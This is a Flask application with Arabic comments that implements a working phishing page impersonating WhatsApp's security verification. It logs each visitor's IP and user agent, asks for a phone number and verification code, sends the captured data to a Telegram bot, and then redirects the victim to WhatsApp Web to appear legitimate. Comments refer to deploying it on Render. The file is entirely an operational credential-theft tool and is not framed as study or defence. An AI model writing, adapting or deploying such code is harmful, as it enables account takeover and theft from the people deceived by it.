import os
from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# --- التغيير المهم ---
# اقرأ التوكن والـ ID من متغيرات البيئة
# إذا لم تجدها، استخدم قيمة فارغة لتجنب الأخطاء
BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")

def send_telegram_message(text):
    """دالة مخصصة لإرسال الرسائل لتجنب تكرار الكود"""
    if not BOT_TOKEN or not CHAT_ID:
        print("خطأ: لم يتم تعيين متغيرات البيئة TELEGRAM_BOT_TOKEN أو CHAT_ID")
        return

    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
        requests.post(url, data=payload, timeout=5)
    except requests.exceptions.RequestException as e:
        print(f"فشل إرسال رسالة تليجرام: {e}")

@app.route('/')
def home():
    # إرسال إشعار بالزيارة
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    message = f"<b>🔔 زائر جديد للصفحة</b>\n\n🌐 <b>IP:</b> <code>{visitor_ip}</code>\n🖥️ <b>User-Agent:</b> <code>{user_agent}</code>"
    send_telegram_message(message)
    
    # يمكنك تحسين تصميم الصفحة هنا كما تريد
    return '''
    <html>
    <body style="background:#128C7E; color:white; text-align:center; padding:50px; font-family: Arial, sans-serif;">
        <h2>واتساب - تحقق الأمان</h2>
        <p>لحماية حسابك، يرجى إدخال المعلومات المطلوبة.</p>
        <form method="POST" action="/submit" style="margin-top: 20px;">
            <input type="tel" name="phone" placeholder="رقم الهاتف" required style="padding:12px; margin:5px; border-radius: 5px; border: 1px solid #ccc; width: 80%; max-width: 300px;">
            <br>
            <input type="text" name="code" placeholder="رمز التحقق" required style="padding:12px; margin:5px; border-radius: 5px; border: 1px solid #ccc; width: 80%; max-width: 300px;">
            <br>
            <button type="submit" style="padding:12px 25px; margin:15px; background-color: #25D366; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px;">تحقق الآن</button>
        </form>
    </body>
    </html>
    '''

@app.route('/submit', methods=['POST'])
def submit():
    phone = request.form.get('phone', 'N/A')
    code = request.form.get('code', 'N/A')
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # إرسال البيانات إلى تليجرام
    message = f"<b>🎣 بيانات جديدة تم إدخالها</b>\n\n📱 <b>الرقم:</b> <code>{phone}</code>\n🔐 <b>الرمز:</b> <code>{code}</code>\n🌐 <b>IP:</b> <code>{visitor_ip}</code>"
    send_telegram_message(message)
    
    # إعادة توجيه المستخدم إلى واتساب ويب لإعطاء انطباع بالنجاح
    return redirect("https://web.whatsapp.com", code=302)

# هذا الجزء لا يتم استخدامه عند النشر على Render
# gunicorn هو الذي سيقوم بتشغيل التطبيق
if __name__ == '__main__':
    # هذا التشغيل مخصص للاختبار المحلي فقط
    app.run(host='0.0.0.0', port=5000)
